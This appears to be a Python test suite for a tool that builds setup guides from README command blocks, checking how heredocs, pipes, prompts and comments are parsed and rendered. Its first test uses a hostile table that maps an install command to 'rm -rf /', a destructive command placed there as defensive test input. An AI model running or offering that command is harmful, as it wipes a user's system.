    for hostile in ([], "x", {"pip install x": "rm -rf /"}, {"pip install x": ["powershell"]}):             # a stored table that is not what facts.build writes
        d = make_draft({**FACTS, "shells": hostile}, "vi")
        d["guide"]["steps"][0].update(commands=["pip install x"])
        assert "```bash\npip install x\n```" in render(tmp_path / f"h{abs(hash(str(hostile)))}", d, facts={**FACTS, "shells": hostile})[1]


ONE_CMD_README = PAPER_README + "\n```bash\npip install one-tool\n```\n"
ONE_CMD_FACTS = {**FACTS, "readme": ONE_CMD_README, "links": readme.links(ONE_CMD_README), "blocks": readme.blocks(ONE_CMD_README)}


def test_the_only_command_line_of_a_readme_has_to_be_in_the_guide():
    d = short_guide(ONE_CMD_FACTS, 1)
    assert any("guide.steps" in e and "uses it" in e for e in errs(d, ONE_CMD_FACTS))
    d["guide"]["steps"][0].update(commands=["pip install one-tool"], evidence="README")
    assert not any("guide.steps" in e for e in errs(d, ONE_CMD_FACTS))
    assert not any("guide.steps" in e for e in errs(short_guide(PAPER_FACTS, 1), PAPER_FACTS))                   # a README with no command line asks for none


GROUP_README = (README + "\n```bash\ncat > conf.yml <<EOF\nmodel: x\n\nkey: y\nEOF\npip install heredoc-tool\ncat > other.yml <<'EOF'\nmodel: z\nEOF\n```\n")
GROUP_FACTS = {**FACTS, "readme": GROUP_README, "links": readme.links(GROUP_README), "blocks": readme.blocks(GROUP_README)}
GROUP = ["cat > conf.yml <<EOF", "model: x", "", "key: y", "EOF"]


def test_a_heredoc_is_listed_whole_or_not_at_all():
    """`model: x` or `EOF` alone is not a command, and an opening line without its body waits for input."""
    ok = [GROUP, GROUP + ["pip install heredoc-tool"], ["pip install heredoc-tool"] + GROUP, GROUP + ["cat > other.yml <<'EOF'", "model: z", "EOF"]]
    bad = [["model: x"], ["EOF"], ["key: y"], GROUP[:1], GROUP[:2], GROUP[:4], GROUP[1:], ["model: x"] + GROUP, GROUP[:3] + ["pip install heredoc-tool"],
           ["cat > conf.yml <<EOF", "model: x", "key: y", "EOF"]]
    for commands, good in [(c, True) for c in ok] + [(c, False) for c in bad]:
        d = make_draft(GROUP_FACTS, "vi")
        d["guide"]["steps"][0].update(commands=commands, evidence="README")
        found = [e for e in errs(d, GROUP_FACTS) if "steps[0].commands" in e]
        assert (not found) is good, (commands, found)
    d = make_draft(GROUP_FACTS, "vi")
    d["guide"]["steps"][0].update(commands=["model: x"], evidence="README")
    d["guide"]["steps"][1].update(commands=GROUP, evidence="README")
    assert [e for e in errs(d, GROUP_FACTS) if "commands" in e] and not any("steps[1].commands" in e for e in errs(d, GROUP_FACTS))      # per step


def test_a_line_that_is_a_command_elsewhere_in_the_readme_may_stand_alone_even_if_a_heredoc_holds_it_too():
    text = README + "\n```bash\ncat <<EOF\nsame line\nEOF\nsame line\n```\n"
    facts = {**FACTS, "readme": text, "links": readme.links(text), "blocks": readme.blocks(text)}
    d = make_draft(facts, "vi")
    d["guide"]["steps"][0].update(commands=["same line"], evidence="README")
    assert not any("steps[0].commands" in e for e in errs(d, facts))


LONG_GROUP = ["cat > big.yml <<EOF"] + [f"k{i}: {i}" for i in range(19)] + ["EOF"]                 # 21 entries
LONG_README = README + "\n```bash\n" + "\n".join(LONG_GROUP) + "\n```\n"
LONG_FACTS = {**FACTS, "readme": LONG_README, "links": readme.links(LONG_README), "blocks": readme.blocks(LONG_README)}


def test_a_whole_heredoc_counts_as_one_command_whatever_its_length():
    def problems(commands):
        d = make_draft(LONG_FACTS, "vi")
        d["guide"]["steps"][0].update(commands=commands, evidence="README")
        return [e for e in errs(d, LONG_FACTS) if "steps[0].commands" in e]
    assert problems(LONG_GROUP) == [] and problems(LONG_GROUP + ["pip install sample-agent-kit"] * 11) == []                  # 1 + 11 = 12 commands in 32 entries
    assert any("needs 0-12 items" in e for e in problems(LONG_GROUP + ["pip install sample-agent-kit"] * 12))               # 13
    assert any("needs 0-12 items" in e for e in problems(["pip install sample-agent-kit"] * 13))
    assert any("needs 0-60 items" in e for e in problems(["pip install sample-agent-kit"] * 61))                             # the entries are bounded too
    assert problems(LONG_GROUP[:12]) != []                                                                     # a part of it is still refused


PROMPT_README = README + "\n```console\nuser@host:~$ pip install prompt-tool\nC:\\Users\\me> winget install prompt-tool\nInstalled prompt-tool\n```\n"
PROMPT_FACTS = {**FACTS, "readme": PROMPT_README, "links": readme.links(PROMPT_README), "blocks": readme.blocks(PROMPT_README)}


def test_a_command_after_a_conventional_transcript_prompt_is_a_command_and_the_output_is_not():
    for command, ok in (("pip install prompt-tool", True), ("user@host:~$ pip install prompt-tool", True), ("winget install prompt-tool", True),
                        ("C:\\Users\\me> winget install prompt-tool", True), ("Installed prompt-tool", False)):
        d = make_draft(PROMPT_FACTS, "vi")
        d["guide"]["steps"][0].update(commands=[command], evidence="README")
        assert (not any("steps[0].commands" in e for e in errs(d, PROMPT_FACTS))) is ok, command
    assert {"pip install prompt-tool", "winget install prompt-tool"} <= set(readme.setup_commands(PROMPT_README))


QUOTE_README = README + "\n```bash\nexport MESSAGE=\"hello # world\"\npip install quote-tool  # installs it\n```\n"
QUOTE_FACTS = {**FACTS, "readme": QUOTE_README, "links": readme.links(QUOTE_README), "blocks": readme.blocks(QUOTE_README)}


def test_a_command_cut_at_a_hash_inside_quotes_is_not_a_command_but_a_real_trailing_comment_is_dropped():
    for command, ok in (('export MESSAGE="hello # world"', True), ('export MESSAGE="hello', False), ("pip install quote-tool", True),
                        ("pip install quote-tool  # installs it", True), ("pip install quote-tool  # installs", False)):
        d = make_draft(QUOTE_FACTS, "vi")
        d["guide"]["steps"][0].update(commands=[command], evidence="README")
        assert (not any("steps[0].commands" in e for e in errs(d, QUOTE_FACTS))) is ok, command


SAMPLE_README = (README + "\n```yaml\nmodel: llama\nport: 8080\n```\n\n```python\nimport os\nprint('x')\n```\n\n```\ncat > s.yml <<EOF\nmodel: z\nEOF\n```\n\n"
                 "```bash\ncat <<EOF\nnever closed\n```\n")
SAMPLE_FACTS = {**FACTS, "readme": SAMPLE_README, "links": readme.links(SAMPLE_README), "blocks": readme.blocks(SAMPLE_README)}


def test_a_line_of_a_configuration_or_code_sample_is_not_a_command_but_a_heredoc_is_whole_and_an_unfinished_one_is_none():
    for commands, ok in ((["model: llama"], False), (["port: 8080"], False), (["import os"], False), (["print('x')"], False),
                         (["cat > s.yml <<EOF", "model: z", "EOF"], True), (["cat > s.yml <<EOF", "model: z"], False), (["cat <<EOF"], False),
                         (["never closed"], False)):
        d = make_draft(SAMPLE_FACTS, "vi")
        d["guide"]["steps"][0].update(commands=commands, evidence="README")
        assert (not any("steps[0].commands" in e for e in errs(d, SAMPLE_FACTS))) is ok, commands


PIPE_README = README + "\n```bash\nprintf foo |\nsed s/foo/bar/\necho \"hello\nworld\"\n```\n"
PIPE_FACTS = {**FACTS, "readme": PIPE_README, "links": readme.links(PIPE_README), "blocks": readme.blocks(PIPE_README)}


def test_a_piece_of_a_command_the_shell_grammar_splits_over_lines_is_not_a_command():
    for command, ok in (("printf foo | sed s/foo/bar/", True), ("sed s/foo/bar/", False), ("printf foo |", False),
                        ('echo "hello world"', True), ('world"', False), ('echo "hello', False)):
        d = make_draft(PIPE_FACTS, "vi")
        d["guide"]["steps"][0].update(commands=[command], evidence="README")
        assert (not any("steps[0].commands" in e for e in errs(d, PIPE_FACTS))) is ok, command


PRICE_README = README + "\n```bash\ncat > t.txt <<EOF\n$ literal price\nEOF\n$ make\n```\n"
PRICE_FACTS = {**FACTS, "readme": PRICE_README, "links": readme.links(PRICE_README), "blocks": readme.blocks(PRICE_README)}


def test_a_line_that_looks_like_a_prompt_inside_a_heredoc_is_data_and_stays_in_the_guide(tmp_path):
    whole = ["cat > t.txt <<EOF", "$ literal price", "EOF"]
    assert gates.command_texts(PRICE_README)["literal price"] == ["$ literal price"] and gates.command_texts(PRICE_README)["make"] == ["make"]
    for commands in (whole, ["cat > t.txt <<EOF", "literal price", "EOF"]):                     # copied as is, or without the "$ " a model may drop
        d = make_draft(PRICE_FACTS, "vi")
        d["guide"]["steps"][0].update(commands=commands + ["$ make"], evidence="README")
        assert not any("steps[0].commands" in e for e in errs(d, PRICE_FACTS))
        fixed = gates.canonicalize(d, PRICE_FACTS)
        assert fixed["guide"]["steps"][0]["commands"] == whole + ["make"]                    # the data keeps its "$ ", the command loses its prompt
    md = render(tmp_path, fixed, facts=PRICE_FACTS)[1]
    assert "```bash\ncat > t.txt <<EOF\n$ literal price\nEOF\nmake\n```" in md


def test_the_output_lines_of_a_console_transcript_are_not_commands():
    text = README + "\n```console\n$ my-tool serve\nServer started\nListening on port 8000\n```\n"
    facts = {**FACTS, "readme": text, "links": readme.links(text), "blocks": readme.blocks(text)}
    commands = gates.readme_commands(text)
    assert "my-tool serve" in commands and "Server started" not in commands and "Listening on port 8000" not in commands
    for command, ok in (("my-tool serve", True), ("$ my-tool serve", True), ("Server started", False), ("Listening on port 8000", False)):
        d = make_draft(facts, "vi")
        d["guide"]["steps"][0].update(commands=[command], evidence="README")
        assert (not any("steps[0].commands" in e for e in errs(d, facts))) is ok, command
    assert "Server started" in gates.readme_commands(README + "\n```bash\nServer started\n```\n")       # in a shell block every line is typed


def test_every_sample_the_readme_module_offers_is_one_the_renderer_prints():
    """The count of lines is the physical one, blank lines included, in both places: a sample of 25 settings apart by blank lines is 49 lines."""
    spaced = "\n\n".join(f"key{i} = {i}" for i in range(25))
    fits = "\n".join(f"key{i} = {i}" for i in range(readme.SNIPPET_LINES))
    text = f"## Configuration\n\n```toml\n{spaced}\n```\n\n```toml\n{fits}\n```\n"
    offered = readme.blocks(text)
    assert [body for _, body in offered] == [fits]
    for ref in range(len(offered)):
        assert digest._snippet({"blocks": offered}, ref, {"snippet": "Sample"})
    assert digest._snippet({"blocks": [["toml", spaced]]}, 0, {"snippet": "Sample"}) == []      # what blocks() no longer offers is not printed either


TWO_SEDS = README + "\n```bash\nsed 's/a  b/x/' f\nsed 's/a b/x/' f\n```\n"
TWO_SEDS_FACTS = {**FACTS, "readme": TWO_SEDS, "links": readme.links(TWO_SEDS), "blocks": readme.blocks(TWO_SEDS)}


def test_two_readme_commands_that_differ_only_in_significant_spaces_are_both_kept_verbatim():
    first, second = "sed 's/a  b/x/' f", "sed 's/a b/x/' f"
    for command in (first, second):
        d = make_draft(TWO_SEDS_FACTS, "vi")
        d["guide"]["steps"][0].update(commands=[command], evidence="README")
        assert gates.canonicalize(d, TWO_SEDS_FACTS)["guide"]["steps"][0]["commands"] == [command]       # each is its own text, not rewritten
    d = make_draft(TWO_SEDS_FACTS, "vi")
    d["guide"]["steps"][0].update(commands=["sed  's/a b/x/'  f"], evidence="README")                        # neither text exactly: the first one
    assert not any("commands" in e for e in errs(d, TWO_SEDS_FACTS))
    assert gates.canonicalize(d, TWO_SEDS_FACTS)["guide"]["steps"][0]["commands"] == [first]
    assert gates.command_texts(TWO_SEDS)["sed 's/a b/x/' f"] == [first, second]


def test_a_readme_prose_line_in_commands_does_not_satisfy_the_rule_that_a_guide_uses_the_readmes_commands():
    prose = "Sample Agent Kit lets a small team run AI agents that read tickets and draft replies."
    d = make_draft(FACTS, "vi")
    for step in d["guide"]["steps"]:
        step["commands"] = []
    d["guide"]["steps"][0]["commands"] = [prose]
    found = errs(d)
    assert any("uses none of them" in e for e in found) and not any("steps[0].commands" in e for e in found), found
    d["guide"]["steps"][0]["commands"] = [prose, "pip install sample-agent-kit"]
    assert errs(d) == []


HEREDOC = README + "\n```bash\ncat > config.yaml <<EOF\nllm:\n  model: x\n\n  key: y\nEOF\n```\n"
HEREDOC_FACTS = {**FACTS, "readme": HEREDOC, "links": readme.links(HEREDOC), "blocks": readme.blocks(HEREDOC)}
HEREDOC_BODY = "cat > config.yaml <<EOF\nllm:\n  model: x\n\n  key: y\nEOF"


def test_a_heredoc_is_shown_with_its_indentation_and_blank_lines_even_if_the_model_lost_them(tmp_path):
    lost = ["cat > config.yaml <<EOF", "llm:", "model: x", "", "key: y", "EOF"]       # one entry per line, a blank entry is a blank line
    d = make_draft(HEREDOC_FACTS, "vi")
    d["guide"]["steps"][0].update(commands=lost, evidence="README")
    assert not any("commands" in e for e in errs(d, HEREDOC_FACTS))
    fixed = gates.canonicalize(d, HEREDOC_FACTS)
    assert fixed["guide"]["steps"][0]["commands"] == ["cat > config.yaml <<EOF", "llm:", "  model: x", "", "  key: y", "EOF"]
    assert f"```bash\n{HEREDOC_BODY}\n```" in render(tmp_path, fixed, facts=HEREDOC_FACTS)[1]
    assert gates.canonicalize(fixed, HEREDOC_FACTS) == fixed                           # idempotent


def test_only_an_empty_entry_is_a_blank_line_and_a_whitespace_only_one_is_still_refused():
    d = make_draft(HEREDOC_FACTS, "vi")
    d["guide"]["steps"][0].update(commands=["llm:", "  "], evidence="README")
    assert any("steps[0].commands" in e for e in errs(d, HEREDOC_FACTS))


def test_a_step_may_list_up_to_twelve_lines_of_commands_so_a_heredoc_fits():
    d = make_draft(FACTS, "vi")
    d["guide"]["steps"][0].update(commands=["pip install sample-agent-kit"] * 12, evidence="README")
    assert not any("needs 0-12" in e for e in errs(d))
    d["guide"]["steps"][0]["commands"].append("pip install sample-agent-kit")
    assert any("needs 0-12" in e for e in errs(d))
